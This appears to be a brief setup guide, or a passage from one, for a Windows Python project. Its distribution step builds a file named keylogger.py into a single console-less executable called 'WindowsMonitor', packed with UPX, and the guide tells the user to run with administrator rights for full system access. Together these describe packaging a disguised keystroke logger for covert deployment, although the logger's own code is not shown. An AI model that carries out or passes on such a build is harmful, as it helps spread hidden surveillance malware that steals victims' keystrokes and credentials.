# Windows Setup Guide

## Development Environment
1. Install Python 3.8+ from python.org
2. Run as Administrator for full system access
3. Install dependencies from requirements.txt
4. Test in Windows Sandbox or VM first

## Building for Distribution
```cmd
# Create standalone EXE
pyinstaller --onefile --noconsole --name=WindowsMonitor --upx-dir=./upx src/keylogger.py
